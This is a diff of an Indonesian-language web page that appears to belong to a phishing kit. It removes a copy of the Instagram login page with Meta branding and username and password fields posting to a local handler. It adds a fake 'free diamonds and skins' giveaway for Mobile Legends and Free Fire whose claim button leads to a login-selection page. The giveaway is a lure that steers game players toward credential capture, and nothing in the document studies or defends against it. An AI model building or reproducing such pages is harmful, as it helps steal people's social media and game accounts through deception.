@@ -1,195 +1,96 @@
 <!DOCTYPE html>
-
 <html lang="id" data-bs-theme="auto">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="styles/style.css"/>
-  <title>Instagram</title>
-  
+  <title>Klaim Hadiah - Pusat Topup Game</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+  <style>
+    body { background-color: #f8f9fa; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+    .hero { background: linear-gradient(135deg, #0095f6, #1877f2); color: white; padding: 40px 20px; text-align: center; border-bottom-left-radius: 30px; border-bottom-right-radius: 30px; }
+    .game-card { border: none; border-radius: 15px; transition: transform 0.2s; cursor: pointer; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+    .game-card:hover { transform: translateY(-5px); }
+    .game-card img { height: 120px; object-fit: cover; }
+    .reward-item { border: 1px solid #dee2e6; border-radius: 10px; padding: 15px; margin-bottom: 10px; cursor: pointer; transition: all 0.2s; }
+    .reward-item:hover { border-color: #0095f6; background-color: #e7f3ff; }
+    .reward-item.active { border-color: #0095f6; background-color: #e7f3ff; font-weight: bold; }
+    .btn-claim { border-radius: 30px; padding: 12px; font-weight: bold; font-size: 1.1rem; }
+  </style>
 </head>
 <body>
-  <main class="container">
-    
-    <p id="currentLang" class="text-secondary mx-auto text-center my-5" role="button" data-bs-toggle="offcanvas" data-bs-target="#sheetBottom" aria-controls="sheetBottom">
-  Bahasa Indonesia <small>▼</small>
-</p>
 
-        
-    <div class="container mb-5 d-flex justify-content-center align-items-center">
-  <img src="./assets/instagram.png" class="w-25">
-</div>
-
-    
-<form id="loginForm" class="d-flex flex-column justify-content-center align-items-center fade-in" style="animation-delay: 0.1s;" action="/login-process" method="POST">
-  
-  <div class="w-100 mb-3">
-    <input type="text" name="username" id="username" class="form-control ig-input" placeholder="Nama pengguna, email, atau nomor ponsel" required autocomplete="username">
+  <div class="hero mb-4">
+    <h1 class="fw-bold">GIVEAWAY HADIAH GAME</h1>
+    <p>Pilih game dan klaim hadiah gratis lo hari ini!</p>
   </div>
-  
-  <div class="w-100 mb-4 password-wrapper">
-    <input type="password" name="password" id="password" class="form-control ig-input" placeholder="Kata sandi" required autocomplete="current-password">
-    <button type="button" class="toggle-password" id="togglePassword">
-      <i class="bi bi-eye"></i>
-    </button>
-  </div>
-  
-  <button type="submit" class="btn btn-primary w-100 fw-bold rounded-5 ig-btn-login" id="loginBtn">Login</button>
 
-</form>
-    
-<div class="d-flex align-items-center justify-content-center my-3">
-  <a href="#" id="forgotLink" class="text-decoration-none text-body">Lupa kata sandi ?</a>
-</div>
-    
-    <div class="ig-divider fade-in" style="animation-delay: 0.25s;">
-      <span>ATAU</span>
+  <div class="container pb-5">
+    <h5 class="mb-3 fw-bold"><i class="bi bi-controller"></i> Pilih Game</h5>
+    <div class="row g-3 mb-4">
+      <div class="col-6 col-md-4">
+        <div class="card game-card text-center" onclick="selectGame('Mobile Legends', this)">
+          <img src="https://img.api-man.site/v1/get?url=https://m.mobilelegends.com/static/images/logo.png" class="card-img-top" alt="ML">
+          <div class="card-body py-2"><small class="fw-bold">Mobile Legends</small></div>
+        </div>
+      </div>
+      <div class="col-6 col-md-4">
+        <div class="card game-card text-center" onclick="selectGame('Free Fire', this)">
+          <img src="https://img.api-man.site/v1/get?url=https://ff.garena.com/static/images/logo_og.png" class="card-img-top" alt="FF">
+          <div class="card-body py-2"><small class="fw-bold">Free Fire</small></div>
+        </div>
+      </div>
     </div>
-    
-    <button type="button" id="createBtn" class="btn border-primary btn-transparent my-5 w-100 fw-bold rounded-5 text-primary">Buat akun baru</button>
-    
-    <div class="container d-flex align-items-center justify-content-center w-100 huruf">
-      <img class="mb-3 mx-2" src="./assets/meta-brands-solid-full.svg">
-      <p class="text-primary fw-bold fs-5">
-         Meta
-      </p>
-    </div>
-   </main>
-  
 
-   <!-- Pemilihan bahasa -->
-<div class="offcanvas offcanvas-bottom w-100 rounded-top-4" tabindex="-1" id="sheetBottom" aria-labelledby="sheetBottomLabel" style="height: 75vh;">
-  
-  <div class="offcanvas-header justify-content-center flex-column pt-3 pb-1 border-bottom" style="border-bottom: 1px solid var(--ig-border);">
-    
-    <div class="line rounded-5 bg-secondary mb-3 sheet-line" style="width: 40px; height: 5px; opacity: 0.5;"></div>
-    
-    <div class="d-flex justify-content-between align-items-center w-100">
-      <h6 class="offcanvas-title text-body" id="sheetBottomLabel" style="font-size: 16px; font-weight: 600; color: var(--ig-text);">Pilih Bahasa</h6>
-      <button type="button" class="btn bg-transparent border-0 text-body fs-4 p-0 btn-close" data-bs-dismiss="offcanvas" aria-label="Close" style="font-size: 12px;">✕</button>
+    <div id="reward-section" style="display:none;">
+      <h5 class="mb-3 fw-bold"><i class="bi bi-gift"></i> Pilih Hadiah</h5>
+      <div class="reward-list mb-4">
+        <div class="reward-item d-flex justify-content-between align-items-center" onclick="selectReward('1000 Diamonds', this)">
+          <span>1000 Diamonds</span>
+          <i class="bi bi-check-circle-fill text-primary" style="display:none;"></i>
+        </div>
+        <div class="reward-item d-flex justify-content-between align-items-center" onclick="selectReward('2500 Diamonds', this)">
+          <span>2500 Diamonds</span>
+          <i class="bi bi-check-circle-fill text-primary" style="display:none;"></i>
+        </div>
+        <div class="reward-item d-flex justify-content-between align-items-center" onclick="selectReward('Skin Epic Gratis', this)">
+          <span>Skin Epic Gratis</span>
+          <i class="bi bi-check-circle-fill text-primary" style="display:none;"></i>
+        </div>
+      </div>
+
+      <button id="claimBtn" class="btn btn-primary w-100 btn-claim" onclick="goToLogin()" disabled>KLAIM SEKARANG</button>
     </div>
   </div>
 
-  <div class="offcanvas-body px-3 pb-4">
-    
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="English" data-lang-id="en">
-      <p class="text-body m-0">English</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
+  <script>
+    let selectedGame = '';
+    let selectedReward = '';
 
-    <div class="language-option active d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Bahasa Indonesia" data-lang-id="id">
-      <p class="text-body m-0">Bahasa Indonesia</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
+    function selectGame(game, element) {
+      selectedGame = game;
+      document.querySelectorAll('.game-card').forEach(c => c.style.border = 'none');
+      element.style.border = '3px solid #0095f6';
+      document.getElementById('reward-section').style.display = 'block';
+      localStorage.setItem('selected_game', game);
+      window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+    }
 
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Español" data-lang-id="es">
-      <p class="text-body m-0">Español</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
+    function selectReward(reward, element) {
+      selectedReward = reward;
+      document.querySelectorAll('.reward-item').forEach(r => {
+        r.classList.remove('active');
+        r.querySelector('i').style.display = 'none';
+      });
+      element.classList.add('active');
+      element.querySelector('i').style.display = 'block';
+      document.getElementById('claimBtn').disabled = false;
+      localStorage.setItem('selected_reward', reward);
+    }
 
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Português (Brasil)" data-lang-id="pt">
-      <p class="text-body m-0">Português (Brasil)</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Français" data-lang-id="fr">
-      <p class="text-body m-0">Français</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-    
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Sunda" data-lang-id="su">
-      <p class="text-body m-0">Sunda</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-    
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Jawa" data-lang-id="jv">
-      <p class="text-body m-0">Jawa</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-    
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Batak" data-lang-id="btk">
-      <p class="text-body m-0">Batak</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-    
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Minang" data-lang-id="min">
-      <p class="text-body m-0">Minang</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-    
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="ไทย" data-lang-id="th">
-      <p class="text-body m-0">ไทย</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-    
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="中文" data-lang-id="zh">
-      <p class="text-body m-0">中文</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-    
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="日本語" data-lang-id="ja">
-      <p class="text-body m-0">日本語</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-    
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Italiano" data-lang-id="it">
-      <p class="text-body m-0">Italiano</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="العربية" data-lang-id="ar">
-      <p class="text-body m-0">العربية</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="한국어" data-lang-id="ko">
-      <p class="text-body m-0">한국어</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="हिन्दी" data-lang-id="hi">
-      <p class="text-body m-0">हिन्दी</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Tiếng Việt" data-lang-id="vi">
-      <p class="text-body m-0">Tiếng Việt</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Türkçe" data-lang-id="tr">
-      <p class="text-body m-0">Türkçe</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Deutsch" data-lang-id="de">
-      <p class="text-body m-0">Deutsch</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Русский" data-lang-id="ru">
-      <p class="text-body m-0">Русский</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Bahasa Melayu" data-lang-id="ms">
-      <p class="text-body m-0">Bahasa Melayu</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-
-    <div class="language-option d-flex justify-content-between align-items-center py-3 border-bottom" data-lang="Bahasa Banjar" data-lang-id="bjn">
-      <p class="text-body m-0">Bahasa Banjar</p>
-      <i class="bi bi-check-lg language-check"></i>
-    </div>
-
-    
-  </div>
-</div>
-
-  
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    function goToLogin() {
+      window.location.href = 'pages/login-selection.html';
+    }
+  </script>
 </body>
-<script type="module" src="scripts/handler.js" defer></script>
 </html>
